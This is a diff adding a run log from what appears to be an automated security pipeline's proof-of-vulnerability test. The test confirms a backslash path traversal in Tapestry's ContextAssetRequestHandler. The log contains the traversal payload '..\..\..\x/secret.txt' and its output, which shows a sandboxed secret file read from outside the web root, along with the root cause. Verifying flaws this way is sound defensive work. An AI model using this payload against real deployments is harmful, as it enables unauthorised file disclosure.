@@ -1,0 +1,15 @@
+$ docker run --rm -v /Users/mohsen/dev/personal/autosec/security_pipeline_runs/20260717_034446_finding-11bd97cc3c1c/worktree:/workspace/repo -w /workspace/repo simpleautosec-finding-11bd97cc3c1c:6479321ee913 bash -lc bash .security-pipeline/pov/run_pov.sh
+exit_code=0
+timed_out=false
+
+--- stdout ---
+[POV] handled = true
+[POV] resource.getPath() = ..\..\..\x/secret.txt
+[POV] webAppRoot         = /tmp/tapestry-pathtraversal-pov-1922967420174224096/sandboxRoot/level1/level2/webapp
+[POV] secretFile         = /tmp/tapestry-pathtraversal-pov-1922967420174224096/sandboxRoot/x/secret.txt
+[POV] streamed content   = TOP-SECRET-271110cc6b6
+[POV] leakedSecret       = true
+[POV] VULNERABLE: ContextAssetRequestHandler.handleAssetRequest() streamed a file OUTSIDE the web application root ('/tmp/tapestry-pathtraversal-pov-1922967420174224096/sandboxRoot/level1/level2/webapp') by way of an un-normalized '\' segment in the request path. AbstractResource.forFile() only recognizes '/' as a segment separator, so the embedded '..' traversal survives into the resolved Resource path untouched.
+
+--- stderr ---
+
